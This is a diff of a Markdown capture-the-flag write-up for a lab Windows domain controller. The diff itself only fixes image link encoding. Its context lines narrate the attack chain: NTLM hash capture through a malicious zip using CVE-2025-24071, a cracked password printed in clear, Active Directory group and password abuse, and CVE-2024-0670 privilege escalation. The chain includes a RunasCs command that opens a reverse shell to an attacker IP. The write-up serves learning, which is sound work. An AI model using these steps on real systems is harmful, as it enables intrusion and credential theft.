@@ -119,9 +119,9 @@ Host script results:
 ```
 
 ### Port 80
-![Pasted image 20260220092736](../Attachments/Pasted20image%2020260220092736.png)
+![Pasted image 20260220092736](../Attachments/Pasted%20image%2020260220092736.png)
 - Clicking on About Us > Apply leads to `hire.nanocorp.htb`
-![Pasted image 20260220094521](../Attachments/Pasted20image%2020260220094521.png)
+![Pasted image 20260220094521](../Attachments/Pasted%20image%2020260220094521.png)
 - I can upload a zip file. Looking around I find CVE-2025-24071 windows file explorer vulnerability. https://www.exploit-db.com/exploits/52310
 - With this exploit I can upload a malicious zip file holding a malicious library_ms file which points to my smb. I can then grab the ntlm hash from my responder:
 ```
@@ -141,7 +141,7 @@ sudo responder -I tun0
 [*] Skipping previously captured hash for NANOCORP\web_svc
 
 ```
-![Pasted image 20260220103227](../Attachments/Pasted20image%2020260220103227.png)
+![Pasted image 20260220103227](../Attachments/Pasted%20image%2020260220103227.png)
 
 - Using john I crack it to get a password : `dksehdgh712!@#`
 ```
@@ -198,10 +198,10 @@ INFO: Done in 00M 04S
 INFO: Compressing output into 20260330103705_bloodhound.zip
 ```
 
-![Pasted image 20260330104407](../Attachments/Pasted20image%2020260330104407.png)
+![Pasted image 20260330104407](../Attachments/Pasted%20image%2020260330104407.png)
 
 - web_svc can add self to IT Support group which can then force change password of monitoring_svc account.
-![Pasted image 20260330104523](../Attachments/Pasted20image%2020260330104523.png)
+![Pasted image 20260330104523](../Attachments/Pasted%20image%2020260330104523.png)
 
 - Using BloodyAD I change the group and then the password for monitoring_svc:
 ```
@@ -237,14 +237,14 @@ PS C:\Users\monitoring_svc\Documents> hostname
 DC01
 PS C:\Users\monitoring_svc\Documents>
 ```
-![Pasted image 20260331061904](../Attachments/Pasted20image%2020260331061904.png)
+![Pasted image 20260331061904](../Attachments/Pasted%20image%2020260331061904.png)
 - grab the user flag:
-![Pasted image 20260331061936](../Attachments/Pasted20image%2020260331061936.png)
+![Pasted image 20260331061936](../Attachments/Pasted%20image%2020260331061936.png)
 
 
 ### Privilege Escalation
 - Looking at winPEAS there is one service that seems to be AutoLoaded : Checkmk 2.1
-![Pasted image 20260331063503](../Attachments/Pasted20image%2020260331063503.png)
+![Pasted image 20260331063503](../Attachments/Pasted%20image%2020260331063503.png)
 - Online I find there is a local privilege escalation vulnerability with this version : CVE-2024-0670
 - I grab an exploit from : https://github.com/elsevar11/CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit/blob/main/exploit.ps1
 - Initially on using this exploit I don't get a reverse shell. I try some other PoC exploits and notice I don't have read access to C:\Windows\Temp
@@ -254,7 +254,7 @@ PS C:\Users\monitoring_svc\Documents>
 ```
 .\RunasCs.exe web_svc dksehdgh712!@#  powershell.exe -r 10.10.17.206:9999
 ```
-![Pasted image 20260331083354](../Attachments/Pasted20image%2020260331083354.png)
+![Pasted image 20260331083354](../Attachments/Pasted%20image%2020260331083354.png)
 
 - I then grab the exploit witht his account (and nc.exe which I got already from the earlier account) and execute it:
 ```
@@ -272,10 +272,10 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\exploit4.ps1
 ```
 
 - I grab a shell as `nt authority/system`
-![Pasted image 20260331083548](../Attachments/Pasted20image%2020260331083548.png)
+![Pasted image 20260331083548](../Attachments/Pasted%20image%2020260331083548.png)
 
 - I grab the root flag:
-![Pasted image 20260331083616](../Attachments/Pasted20image%2020260331083616.png)
+![Pasted image 20260331083616](../Attachments/Pasted%20image%2020260331083616.png)
 
 
 ---------
